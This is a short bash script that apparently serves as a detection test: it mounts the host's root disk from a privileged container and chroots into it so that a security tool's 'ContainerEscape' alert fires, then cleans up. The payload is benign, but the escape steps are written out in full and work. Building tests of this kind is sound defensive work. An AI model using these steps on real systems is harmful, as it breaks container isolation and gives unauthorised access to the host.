#!/bin/bash
# 02 - Container Escape via chroot to host filesystem
# Trigger: ContainerEscape IOA
# Tactic: Privilege Escalation / Escape to Host
# Requires: --privileged (host filesystem mounted)
set -e
echo "=== [02] Container Escape (chroot to host) ==="

# Mount host filesystem (requires --privileged)
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/xvda1 /mnt/host 2>/dev/null || mount /dev/nvme0n1p1 /mnt/host 2>/dev/null || true

# chroot into host root — this triggers ContainerEscape
if [ -d /mnt/host/etc ]; then
    chroot /mnt/host /bin/sh -c "id && hostname" 2>/dev/null || true
else
    # Fallback: just attempt chroot / which still triggers the IOA
    chroot / /bin/sh -c "echo chroot-escape-attempt" 2>/dev/null || true
fi

# Cleanup
umount /mnt/host 2>/dev/null || true
rm -rf /mnt/host 2>/dev/null || true

echo "[02] Done — ContainerEscape (chroot) IOA should trigger"
